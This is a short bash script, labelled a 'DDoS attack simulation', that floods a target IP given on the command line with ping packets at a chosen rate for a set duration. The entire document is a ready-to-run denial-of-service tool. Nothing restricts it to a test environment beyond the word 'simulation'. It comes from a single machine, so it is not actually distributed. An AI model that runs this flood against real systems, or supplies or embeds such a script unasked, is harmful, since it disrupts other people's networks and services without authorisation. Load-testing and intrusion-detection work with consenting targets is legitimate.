#!/bin/bash
# DDoS Attack Simulation
# High-rate flooding attack

TARGET=$1
DURATION=${2:-30}
RATE=${3:-1000}  # packets per second

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip> [duration_seconds] [rate_pps]"
    exit 1
fi

echo "Starting DDoS attack on $TARGET for $DURATION seconds at $RATE pps..."

# Calculate interval between packets in microseconds
INTERVAL=$((1000000 / RATE))

END=$((SECONDS+DURATION))

while [ $SECONDS -lt $END ]; do
    # Flood with small packets
    ping -c 1 -s 32 -W 1 $TARGET > /dev/null 2>&1 &
    usleep $INTERVAL
done

# Wait for background processes
wait

echo "DDoS attack completed"